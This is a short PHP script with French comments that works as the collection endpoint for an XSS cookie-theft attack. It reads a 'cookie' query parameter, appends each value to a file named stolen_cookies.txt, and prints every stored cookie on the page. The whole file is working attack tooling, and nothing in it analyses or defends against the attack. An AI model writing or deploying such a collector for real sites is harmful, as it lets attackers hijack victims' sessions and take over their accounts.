<?php
$fichier = "stolen_cookies.txt";
if(isset($_GET['cookie']))
{
    //On stocke les cookies dans un fichier sur le serveur
    $handle = fopen($fichier, "a");
    fwrite($handle, $_GET['cookie']."\r\n");
    fclose($handle);
     
    echo "Ligne ajoutée<br/>";
}
 
//On affiche tous les cookies sur la page
$handle = fopen($fichier, "r");
while($data = fgets($handle))
{
    echo $data . "<br>";
}
fclose($handle);